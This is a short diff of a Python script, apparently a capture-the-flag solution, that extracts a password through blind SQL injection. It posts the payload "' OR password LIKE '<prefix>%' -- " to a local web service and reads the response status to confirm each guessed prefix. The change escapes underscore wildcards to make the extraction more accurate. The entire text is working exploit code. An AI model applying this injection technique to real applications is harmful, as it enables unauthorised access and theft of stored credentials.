@@ -8,7 +8,8 @@ from repeat import repeat
     30
 )
 def get_flag(candidate_string: str) -> bool:
-    payload = f"' OR password LIKE '{candidate_string}%' -- "
+    escaped_string = candidate_string.replace('_', '\\_')
+    payload = f"' OR password LIKE '{escaped_string}%' -- "
     r = requests.post(
         'http://localhost:8080',
         json={
@@ -17,4 +18,10 @@ def get_flag(candidate_string: str) -> bool:
     )
     return r.status_code == 200
 
-print(get_flag())
+
+if __name__ == '__main__':
+    flag = get_flag(
+        parallelism=5
+    )
+    print()
+    print(flag)
